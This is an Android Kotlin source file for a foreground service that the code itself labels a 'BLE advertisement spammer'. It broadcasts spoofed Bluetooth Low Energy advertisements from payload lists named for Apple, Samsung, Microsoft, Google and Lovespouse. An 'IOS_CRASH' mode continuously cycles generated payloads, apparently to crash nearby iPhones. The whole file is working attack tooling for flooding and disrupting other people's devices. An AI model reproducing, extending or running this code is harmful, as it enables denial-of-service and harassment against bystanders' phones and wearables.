package com.example.ble.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.bluetooth.BluetoothManager
import android.bluetooth.le.AdvertiseCallback
import android.bluetooth.le.AdvertiseData
import android.bluetooth.le.AdvertiseSettings
import android.bluetooth.le.AdvertisingSet
import android.bluetooth.le.AdvertisingSetCallback
import android.bluetooth.le.AdvertisingSetParameters
import android.bluetooth.le.BluetoothLeAdvertiser
import android.content.Context
import android.content.Intent
import android.os.IBinder
import android.os.ParcelUuid
import android.util.Log
import androidx.core.app.NotificationCompat
import com.example.ble.MainActivity
import com.example.ble.data.APPLE_PAYLOADS
import com.example.ble.data.BlePayload
import com.example.ble.data.GOOGLE_PAYLOADS
import com.example.ble.data.IOS_CRASH_PAYLOADS
import com.example.ble.data.IosCrashPayloadGenerator
import com.example.ble.data.LOVESPOUSE_PAYLOADS
import com.example.ble.data.MICROSOFT_PAYLOADS
import com.example.ble.data.PayloadCategory
import com.example.ble.data.SAMSUNG_PAYLOADS
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.launch
import java.util.UUID

class BleAdvertiserService : Service() {

    companion object {
        const val ACTION_START = "com.example.ble.ACTION_START_ADVERTISE"
        const val ACTION_STOP = "com.example.ble.ACTION_STOP_ADVERTISE"
        const val EXTRA_INTERVAL_MS = "extra_interval_ms"
        const val EXTRA_TX_POWER = "extra_tx_power"
        const val EXTRA_RANDOMIZE_MAC = "extra_randomize_mac"
        const val NOTIFICATION_CHANNEL_ID = "ble_advertiser_channel"
        const val NOTIFICATION_ID = 1001
        private const val TAG = "BleAdvertiserService"

        @Volatile var isRunning = false
        @Volatile var activeCount = 0
        val statusFlow = MutableStateFlow("Stopped")

        private val ALL_PAYLOADS: List<BlePayload> by lazy {
            APPLE_PAYLOADS + IOS_CRASH_PAYLOADS + MICROSOFT_PAYLOADS + SAMSUNG_PAYLOADS + GOOGLE_PAYLOADS + LOVESPOUSE_PAYLOADS
        }
    }

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var cycleJob: Job? = null
    private var bluetoothLeAdvertiser: BluetoothLeAdvertiser? = null

    // Track active advertising sets and callbacks for cleanup
    private val activeSets = mutableListOf<Pair<AdvertisingSet, AdvertisingSetCallback>>()
    private val legacyCallbacks = mutableListOf<AdvertiseCallback>()

    private var payloads: List<BlePayload> = emptyList()
    private var intervalMs: Long = 100L
    private var txPower: Int = AdvertisingSetParameters.TX_POWER_MEDIUM
    private var randomizeMac: Boolean = false

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        val bluetoothManager = getSystemService(Context.BLUETOOTH_SERVICE) as BluetoothManager
        bluetoothLeAdvertiser = bluetoothManager.adapter?.bluetoothLeAdvertiser
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_START -> {
                val payloadIds = intent.getStringArrayListExtra("payload_ids") ?: arrayListOf()
                payloads = ALL_PAYLOADS.filter { it.id in payloadIds }
                intervalMs = intent.getLongExtra(EXTRA_INTERVAL_MS, 100L)
                txPower = intent.getIntExtra(EXTRA_TX_POWER, AdvertisingSetParameters.TX_POWER_MEDIUM)
                randomizeMac = intent.getBooleanExtra(EXTRA_RANDOMIZE_MAC, false)
                startForeground(NOTIFICATION_ID, buildNotification("Advertising ${payloads.size} payload(s)"))
                startAdvertising()
            }
            ACTION_STOP -> {
                stopAdvertising()
                stopForeground(STOP_FOREGROUND_REMOVE)
                stopSelf()
            }
        }
        return START_NOT_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun startAdvertising() {
        if (payloads.isEmpty()) return
        isRunning = true
        activeCount = payloads.size
        statusFlow.value = "Advertising ${payloads.size} payload(s)"

        val crashPayloads = payloads.filter { it.category == PayloadCategory.IOS_CRASH }
        val normalPayloads = payloads.filter { it.category != PayloadCategory.IOS_CRASH }

        normalPayloads.forEach { payload ->
            startLegacyPayloadAdvertiser(payload)
        }

        if (crashPayloads.isNotEmpty()) {
            var crashIndex = 0
            cycleJob = scope.launch {
                while (true) {
                    val crashPayload = IosCrashPayloadGenerator.nextPayload(crashIndex++)
                    startLegacyPayloadAdvertiser(crashPayload)
                    delay(intervalMs.coerceAtLeast(20L))
                    // Remove and stop oldest crash callbacks to avoid overflow
                    if (legacyCallbacks.size > 10) {
                        val oldest = legacyCallbacks.removeAt(0)
                        try { bluetoothLeAdvertiser?.stopAdvertising(oldest) } catch (_: Exception) {}
                    }
                }
            }
        }
    }

    private fun startLegacyPayloadAdvertiser(payload: BlePayload) {
        val advertiser = bluetoothLeAdvertiser ?: return
        try {
            val advertiseData = buildAdvertiseData(payload)
            val settings = AdvertiseSettings.Builder()
                .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
                .setTxPowerLevel(when (txPower) {
                    AdvertisingSetParameters.TX_POWER_LOW -> AdvertiseSettings.ADVERTISE_TX_POWER_LOW
                    AdvertisingSetParameters.TX_POWER_HIGH -> AdvertiseSettings.ADVERTISE_TX_POWER_HIGH
                    AdvertisingSetParameters.TX_POWER_MAX -> AdvertiseSettings.ADVERTISE_TX_POWER_HIGH
                    else -> AdvertiseSettings.ADVERTISE_TX_POWER_MEDIUM
                })
                .setConnectable(false)
                .build()

            val callback = object : AdvertiseCallback() {
                override fun onStartSuccess(settingsInEffect: AdvertiseSettings?) {
                    Log.d(TAG, "Advertise started: ${payload.name}")
                }
                override fun onStartFailure(errorCode: Int) {
                    Log.w(TAG, "Advertise failed code=$errorCode for ${payload.name}")
                }
            }

            // For Samsung payloads with scan response, use AdvertisingSet API
            if (payload.scanResponseData != null) {
                startWithScanResponse(payload, callback)
            } else {
                synchronized(legacyCallbacks) { legacyCallbacks.add(callback) }
                advertiser.startAdvertising(settings, advertiseData, callback)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Exception starting advertiser for ${payload.name}", e)
        }
    }

    private fun startWithScanResponse(payload: BlePayload, fallbackCallback: AdvertiseCallback) {
        val advertiser = bluetoothLeAdvertiser ?: return
        try {
            val params = AdvertisingSetParameters.Builder()
                .setLegacyMode(true)
                .setConnectable(false)
                .setScannable(true)
                .setInterval(AdvertisingSetParameters.INTERVAL_MIN)
                .setTxPowerLevel(txPower)
                .build()

            val advertiseData = buildAdvertiseData(payload)
            val scanResponse = AdvertiseData.Builder()
                .addManufacturerData(
                    payload.manufacturerData!!.companyId,
                    payload.scanResponseData
                )
                .build()

            val cb = object : AdvertisingSetCallback() {
                override fun onAdvertisingSetStarted(
                    advertisingSet: AdvertisingSet?,
                    txPower: Int,
                    status: Int
                ) {
                    if (status == ADVERTISE_SUCCESS && advertisingSet != null) {
                        synchronized(activeSets) { activeSets.add(Pair(advertisingSet, this)) }
                        Log.d(TAG, "AdvertisingSet started for ${payload.name}")
                    } else {
                        Log.w(TAG, "AdvertisingSet failed status=$status for ${payload.name}")
                        // Fallback to legacy without scan response
                        val settings = AdvertiseSettings.Builder()
                            .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
                            .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
                            .setConnectable(false)
                            .build()
                        synchronized(legacyCallbacks) { legacyCallbacks.add(fallbackCallback) }
                        advertiser.startAdvertising(settings, advertiseData, fallbackCallback)
                    }
                }
            }
            advertiser.startAdvertisingSet(params, advertiseData, scanResponse, null, null, cb)
        } catch (e: Exception) {
            Log.e(TAG, "startWithScanResponse exception", e)
        }
    }

    private fun buildAdvertiseData(payload: BlePayload): AdvertiseData {
        return AdvertiseData.Builder().apply {
            payload.manufacturerData?.let {
                addManufacturerData(it.companyId, it.data)
            }
            payload.serviceData?.let {
                addServiceData(
                    ParcelUuid(UUID.fromString(it.uuid)),
                    it.data
                )
            }
            if (payload.includeDeviceName) setIncludeDeviceName(true)
            setIncludeTxPowerLevel(false)
        }.build()
    }

    private fun stopAdvertising() {
        isRunning = false
        activeCount = 0
        statusFlow.value = "Stopped"
        cycleJob?.cancel()
        cycleJob = null

        val advertiser = bluetoothLeAdvertiser
        synchronized(activeSets) {
            activeSets.forEach { (_, cb) ->
                try { advertiser?.stopAdvertisingSet(cb) } catch (_: Exception) {}
            }
            activeSets.clear()
        }
        synchronized(legacyCallbacks) {
            legacyCallbacks.forEach {
                try { advertiser?.stopAdvertising(it) } catch (_: Exception) {}
            }
            legacyCallbacks.clear()
        }
    }

    private fun createNotificationChannel() {
        val channel = NotificationChannel(
            NOTIFICATION_CHANNEL_ID,
            "BLE Advertiser",
            NotificationManager.IMPORTANCE_LOW
        ).apply { description = "BLE advertisement spammer service" }
        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        nm.createNotificationChannel(channel)
    }

    private fun buildNotification(text: String): Notification {
        val intent = Intent(this, MainActivity::class.java)
        val pi = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_IMMUTABLE)
        return NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
            .setContentTitle("BLE Spammer Active")
            .setContentText(text)
            .setSmallIcon(android.R.drawable.ic_menu_send)
            .setContentIntent(pi)
            .setOngoing(true)
            .build()
    }

    override fun onDestroy() {
        super.onDestroy()
        stopAdvertising()
    }
}
